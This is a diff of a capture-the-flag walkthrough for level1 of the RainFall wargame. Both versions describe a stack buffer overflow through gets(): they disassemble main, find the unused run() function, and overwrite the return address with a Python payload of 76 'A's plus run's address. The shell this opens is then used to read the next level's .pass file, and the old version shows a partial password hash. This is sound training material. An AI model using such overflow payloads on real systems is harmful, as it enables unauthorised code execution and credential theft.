@@ -1,30 +1,30 @@
-nm level1 
+Launch program with gdb and disassemble main
 
-we can see there is two function, main and run 
+$ gdb ./level1
+disas main
 
-gdb $ disass main 
+0x08048480 <+0>:	push   ebp
+0x08048481 <+1>:	mov    ebp,esp
+0x08048483 <+3>:	and    esp,0xfffffff0
+0x08048486 <+6>:	sub    esp,0x50
+0x08048489 <+9>:	lea    eax,[esp+0x10]
+0x0804848d <+13>:	mov    DWORD PTR [esp],eax
+0x08048490 <+16>:	call   0x8048340 <gets@plt>
+0x08048495 <+21>:	leave
+0x08048496 <+22>:	ret
 
-... 
-run is not called in the main
-but there is an overflow 
+At <main+6>, it allocates 80 bytes on the stack.
+At <main+9>, it stores the string returned by <gets@plt> at [esp+16].
+We can then do a buffer overflow to overwrite the $eip registers.
+With objdump we notice that <run> function is never called.
 
-we need to replace the eip with the add of the run fct 
+$ objdump -d ./level1
+...
+08048444 <run>:
+...
 
-disass run : 
-Dump of assembler code for function run:
-   0x08048444 <+0>:	push   %ebp
+We now have to find the offset to overwrite $eip and replace it with <run> address.
 
-$  python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1]' | ./level1 
-Good... Wait what?
-Segmentation fault (core dumped)
-
-here we nedd to catch the shell : cat <(...) - | ./bin
-
-level1@RainFall:~$ cat <(python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1]') - | ./level1 
-Good... Wait what?
-cat /home/user/level2/.pass
-53a4a712787f40ec66c3c26c1f4b164dc[...]
-Segmentation fault (core dumped)
-level1@RainFall:~$ su level2
-
-
+$ cat <(python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])") - | ./level1
+cd /home/user/level2
+cat .pass
